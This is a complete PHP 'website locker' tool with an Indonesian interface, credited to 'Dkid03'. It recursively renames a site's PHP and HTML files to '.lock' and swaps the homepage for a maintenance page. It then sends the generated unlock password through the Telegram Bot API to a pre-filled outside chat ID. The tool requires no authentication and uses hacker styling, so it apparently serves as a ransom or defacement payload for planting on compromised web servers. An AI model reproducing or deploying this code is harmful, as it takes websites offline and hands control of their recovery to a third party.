<?php
// ============================================
// LOCK WEBSITE with TELEGRAM 
// Coded By : Dkid03 
// ============================================

// ------------------- KONFIGURASI -------------------
$bot_token = 'GANTI TOKEN BOT KAMU';
$extensions = ['php', 'html', 'htm', 'phtml'];
$directories = [__DIR__];
$excluded_files = [
    __FILE__,
    __DIR__ . '/maintenance.html',
    __DIR__ . '/index.html',
    __DIR__ . '/unlock.php',
    __DIR__ . '/.lock_password',
];
$password_file = __DIR__ . '/.lock_password';
$maintenance_file = __DIR__ . '/maintenance.html';
$index_file = __DIR__ . '/index.html';
$unlock_file = __DIR__ . '/unlock.php';

// ------------------- FUNGSI KIRIM TELEGRAM -------------------
function kirim_telegram($chat_id, $password, $domain) {
    global $bot_token;
    $unlock_url = $domain . '/unlock.php';
    $text = "🔐 *Website Dikunci*\n\n"
          . "🌐 *URL Website:* $domain\n"
          . "🔑 *Password:* `$password`\n"
          . "🔓 *Halaman Unlock:* $unlock_url\n\n"
          . "Simpan password ini dengan baik.";
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === FALSE) return false;
    $response = json_decode($result, true);
    return isset($response['ok']) && $response['ok'] === true;
}

// ------------------- FUNGSI LOCK FILE -------------------
function lock_files($extensions, $directories, $excluded_files) {
    $locked = 0;
    foreach ($directories as $dir) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $path = $file->getPathname();
                if (in_array($path, $excluded_files)) continue;
                $ext = strtolower($file->getExtension());
                if (in_array($ext, $extensions)) {
                    $newPath = $path . '.lock';
                    if (!file_exists($newPath)) {
                        if (rename($path, $newPath)) $locked++;
                    }
                }
            }
        }
    }
    return $locked;
}

// ------------------- FUNGSI GENERATE UNLOCK.PHP (dengan self-delete) -------------------
function generate_unlock_file($unlock_file, $password_file, $extensions, $directories, $excluded_files, $index_file, $maintenance_file) {
    $content = '<?php
// ========== UNLOCK WEBSITE ==========
$password_file = __DIR__ . \'/.lock_password\';
$extensions = ' . var_export($extensions, true) . ';
$directories = ' . var_export($directories, true) . ';
$excluded_files = ' . var_export(array_merge($excluded_files, [__FILE__]), true) . ';
$index_file = __DIR__ . \'/index.html\';
$maintenance_file = __DIR__ . \'/maintenance.html\';

function unlock_files($extensions, $directories, $excluded_files) {
    $unlocked = 0;
    foreach ($directories as $dir) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $path = $file->getPathname();
                if (substr($path, -5) === \'.lock\') {
                    $original = substr($path, 0, -5);
                    if (!file_exists($original) && !in_array($original, $excluded_files)) {
                        if (rename($path, $original)) $unlocked++;
                    }
                }
            }
        }
    }
    return $unlocked;
}

$message = "";
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
    $input = $_POST["password"];
    if (file_exists($password_file)) {
        $hash = file_get_contents($password_file);
        if (password_verify($input, $hash)) {
            $count = unlock_files($extensions, $directories, $excluded_files);
            unlink($password_file);
            if (file_exists($index_file)) unlink($index_file);
            // Hapus file maintenance dan unlock.php
            if (file_exists($maintenance_file)) unlink($maintenance_file);
            if (file_exists(__FILE__)) unlink(__FILE__);
            $message = "<div class=\'success\'>✅ Website dibuka. $count file dikembalikan. File unlock & maintenance dihapus.</div>";
        } else {
            $message = "<div class=\'error\'>❌ Password salah.</div>";
        }
    } else {
        $message = "<div class=\'error\'>❌ Website tidak dalam keadaan terkunci.</div>";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Unlock Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0a0f1e;
            font-family: "Courier New", monospace;
            color: #00ff9d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #111827;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 0 20px #00ff9d33;
            border: 1px solid #00ff9d;
            width: 90%;
            max-width: 400px;
            text-align: center;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h2 {
            text-shadow: 0 0 5px #00ff9d;
            margin-bottom: 1.5rem;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #1e293b;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            font-family: inherit;
            margin-bottom: 1rem;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            background: transparent;
            border: 2px solid #00ff9d;
            color: #00ff9d;
            padding: 10px 20px;
            font-family: inherit;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            border-radius: 5px;
        }
        button:hover {
            background: #00ff9d;
            color: #0a0f1e;
            box-shadow: 0 0 15px #00ff9d;
        }
        .success, .error {
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 1rem;
            animation: slideIn 0.3s;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success { background: #00ff9d22; border: 1px solid #00ff9d; }
        .error { background: #ff005522; border: 1px solid #ff0055; color: #ff0055; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔓 UNLOCK WEBSITE</h2>
        <?php if (!empty($message)) echo $message; ?>
        <form method="post">
            <input type="password" name="password" placeholder="Masukkan password" required>
            <button type="submit">BUKA</button>
        </form>
    </div>
</body>
</html>';
    file_put_contents($unlock_file, $content);
}

// ------------------- PROSES FORM -------------------
$message = '';
$domain = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        // Upload maintenance
        if ($_POST['action'] === 'upload' && isset($_FILES['html_file'])) {
            $file = $_FILES['html_file'];
            if ($file['error'] === UPLOAD_ERR_OK) {
                $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                if (in_array($ext, ['html', 'htm'])) {
                    if (move_uploaded_file($file['tmp_name'], $maintenance_file)) {
                        $message = '<div class="success">✅ File maintenance berhasil diupload.</div>';
                    } else {
                        $message = '<div class="error">❌ Gagal menyimpan file.</div>';
                    }
                } else {
                    $message = '<div class="error">❌ Hanya file HTML yang diperbolehkan.</div>';
                }
            } else {
                $message = '<div class="error">❌ Error upload.</div>';
            }
        }
        // Lock
        elseif ($_POST['action'] === 'lock' && !empty($_POST['chat_id'])) {
            $chat_id = trim($_POST['chat_id']);
            if (!is_numeric($chat_id)) {
                $message = '<div class="error">❌ Chat ID harus angka.</div>';
            } else {
                $password = bin2hex(random_bytes(8));
                $hash = password_hash($password, PASSWORD_DEFAULT);
                if (file_put_contents($password_file, $hash) === false) {
                    $message = '<div class="error">❌ Gagal menyimpan password.</div>';
                } else {
                    if (kirim_telegram($chat_id, $password, $domain)) {
                        // Buat file unlock.php (dengan fitur self-delete)
                        generate_unlock_file($unlock_file, $password_file, $extensions, $directories, $excluded_files, $index_file, $maintenance_file);
                        
                        // Siapkan halaman maintenance
                        if (file_exists($maintenance_file)) {
                            copy($maintenance_file, $index_file);
                        } else {
                            file_put_contents($index_file, '<!DOCTYPE html><html><head><title>Maintenance</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0a0f1e;color:#00ff9d;font-family:"Courier New",monospace;text-align:center;padding:50px;}</style></head><body><h1>🚧 MAINTENANCE MODE</h1><p>Website sedang dalam pemeliharaan.</p></body></html>');
                        }
                        
                        $count = lock_files($extensions, $directories, $excluded_files);
                        $message = "<div class='success'>✅ Website dikunci. $count file di-lock. Halaman maintenance dipasang.<br>📨 Password telah dikirim ke Telegram.</div>";
                    } else {
                        $message = '<div class="error">❌ Gagal kirim Telegram. Periksa token/chat ID.</div>';
                        unlink($password_file);
                    }
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOCK WEBSITE By Dkid03</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0f1e;
            font-family: 'Courier New', monospace;
            color: #00ff9d;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        /* Efek glitch background */
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0,255,157,0.03) 0px, rgba(0,255,157,0.03) 2px, transparent 2px, transparent 4px);
            pointer-events: none;
            z-index: 1;
        }
        .container {
            position: relative;
            z-index: 10;
            max-width: 700px;
            width: 100%;
            background: #111827ee;
            backdrop-filter: blur(10px);
            border: 2px solid #00ff9d;
            box-shadow: 0 0 30px #00ff9d66, inset 0 0 20px #00ff9d33;
            border-radius: 15px;
            padding: 30px;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        h2 {
            text-align: center;
            font-size: 2rem;
            text-transform: uppercase;
            letter-spacing: 5px;
            text-shadow: 0 0 10px #00ff9d, 0 0 20px #00ff9d;
            margin-bottom: 20px;
            border-bottom: 1px dashed #00ff9d;
            padding-bottom: 10px;
        }
        .warning {
            background: #1e293b;
            border-left: 5px solid #00ff9d;
            padding: 15px;
            margin-bottom: 25px;
            color: #00ff9d;
            font-size: 0.9rem;
            box-shadow: 0 0 10px #00ff9d33;
        }
        .card {
            background: #1e293b;
            border: 1px solid #00ff9d;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 0 15px #00ff9d33;
        }
        .card h3 {
            margin-bottom: 20px;
            color: #00ff9d;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #00ff9d;
            padding-bottom: 8px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #00ff9d;
            text-transform: uppercase;
            font-size: 0.9rem;
            letter-spacing: 1px;
        }
        input[type="text"],
        input[type="number"],
        input[type="file"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: #0a0f1e;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            font-family: inherit;
            border-radius: 5px;
            font-size: 1rem;
            transition: 0.3s;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 15px #00ff9d;
            border-color: #00ff9d;
        }
        button {
            background: transparent;
            border: 2px solid #00ff9d;
            color: #00ff9d;
            padding: 14px 20px;
            font-family: inherit;
            font-size: 1rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            width: 100%;
            border-radius: 5px;
            transition: 0.3s;
            position: relative;
            overflow: hidden;
        }
        button:hover {
            background: #00ff9d;
            color: #0a0f1e;
            box-shadow: 0 0 25px #00ff9d;
        }
        .success, .error {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 25px;
            border: 1px solid;
            font-weight: bold;
            animation: slideIn 0.3s;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success {
            background: #00ff9d22;
            border-color: #00ff9d;
            color: #00ff9d;
        }
        .error {
            background: #ff005522;
            border-color: #ff0055;
            color: #ff0055;
        }
        .status-box {
            background: #1e293b;
            border: 1px solid #00ff9d;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-size: 0.9rem;
        }
        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.75rem;
            letter-spacing: 1px;
        }
        .badge.locked {
            background: #ff0055;
            color: #0a0f1e;
            border: 1px solid #ff0055;
        }
        .badge.unlocked {
            background: #00ff9d;
            color: #0a0f1e;
            border: 1px solid #00ff9d;
        }
        /* Loading overlay */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0f1eee;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            flex-direction: column;
        }
        .loader {
            border: 4px solid #1e293b;
            border-top: 4px solid #00ff9d;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
            box-shadow: 0 0 20px #00ff9d;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .glitch-text {
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 5px;
            animation: glitch 1s infinite;
        }
        @keyframes glitch {
            0% { text-shadow: 0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055; }
            25% { text-shadow: -0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055; }
            50% { text-shadow: 0.025em 0.05em 0 #00ff9d, -0.05em -0.025em 0 #ff0055; }
            75% { text-shadow: -0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055; }
            100% { text-shadow: 0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055; }
        }
        .small-note {
            color: #6c757d;
            font-size: 0.8rem;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div id="loading-overlay">
        <div class="loader"></div>
        <div class="glitch-text">MENGUNCI WEBSITE...</div>
    </div>

    <div class="container">
        <h2>Lock By Dkid03</h2>
        <div class="warning">
            <strong>⚠️ PERINGATAN:</strong> Mengunci akan mengubah nama file (misal .php → .php.lock). Halaman index akan diganti dengan maintenance page. File <strong>unlock.php</strong> akan dibuat otomatis dan akan terhapus setelah unlock.
        </div>

        <?php if (!empty($message)) echo $message; ?>

        <!-- Upload Maintenance -->
        <div class="card">
            <h3>📤 UPLOAD MAINTENANCE</h3>
            <form method="post" enctype="multipart/form-data" id="uploadForm">
                <input type="hidden" name="action" value="upload">
                <div class="form-group">
                    <label for="html_file">File HTML (.html/.htm):</label>
                    <input type="file" name="html_file" id="html_file" accept=".html,.htm" required>
                </div>
                <button type="submit">UPLOAD</button>
                <p class="small-note">File disimpan sebagai maintenance.html</p>
            </form>
        </div>

        <!-- Lock Section -->
        <div class="card">
            <h3>🔒 KUNCI WEBSITE</h3>
            <form method="post" id="lockForm">
                <input type="hidden" name="action" value="lock">
                <div class="form-group">
                    <label for="chat_id">CHAT ID TELEGRAM:</label>
                    <input type="number" name="chat_id" id="chat_id" value="7547598395" required>
                </div>
                <button type="submit" id="lockBtn">KUNCI SEKARANG</button>
                <p class="small-note">Password + URL akan dikirim ke Telegram.</p>
            </form>
        </div>

        <!-- Status Info -->
        <div class="status-box">
            <p><strong>STATUS SISTEM:</strong></p>
            <?php
            if (file_exists($password_file)) {
                echo '<p><span class="badge locked">🔒 TERKUNCI</span> File password ada.</p>';
                if (file_exists($index_file)) echo '<p>📄 Maintenance aktif: index.html</p>';
                if (file_exists($unlock_file)) echo '<p>🔓 unlock.php tersedia.</p>';
            } else {
                echo '<p><span class="badge unlocked">🔓 TERBUKA</span> Website terbuka.</p>';
            }
            if (file_exists($maintenance_file)) {
                echo '<p>📁 File maintenance: maintenance.html siap.</p>';
            } else {
                echo '<p>📁 Belum upload maintenance.</p>';
            }
            ?>
        </div>
    </div>

    <script>
        // Tampilkan loading overlay saat form lock disubmit
        document.getElementById('lockForm').addEventListener('submit', function(e) {
            document.getElementById('loading-overlay').style.display = 'flex';
            document.getElementById('lockBtn').disabled = true;
        });
    </script>
</body>
</html>
